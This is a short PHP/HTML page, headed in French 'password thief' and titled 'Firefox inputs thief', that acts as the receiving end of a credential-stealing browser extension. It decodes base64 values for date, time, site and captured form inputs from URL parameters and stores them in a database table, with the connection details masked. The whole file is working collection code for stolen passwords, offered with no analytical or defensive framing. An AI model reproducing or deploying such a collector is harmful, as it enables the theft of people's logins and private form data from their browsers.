<!DOCTYPE html>

<html>
  <head>
    <title>Firefox inputs thief</title>
    <style>
        h1 {
            text-align: center;
        }
    </style>
  </head>
  <body>
  <h1>Voleur de mots de passes</h1>
<?php

/* Recuperation et decodage base64->utf-8 */
$variable1 = base64_decode($_GET["a"]);
$variable2 = base64_decode($_GET["b"]);
$variable3 = base64_decode($_GET["c"]);
$variable4 = base64_decode($_GET["d"]);

/* Connection à la base de donnée avec PDO */
$bdd = new PDO(***********************************************);

/* Preparation d'une requete sur la bdd */
$insertmbr=$bdd->prepare("INSERT INTO firefoxExtension(date, heure, site, inputs) VALUES(?, ?, ?, ?)");

/* Ajout des infos qui sont passés en variables dynamiques */
$insertmbr->execute(array($variable1, $variable2, $variable3, $variable4));

?>
  </body>
</html>
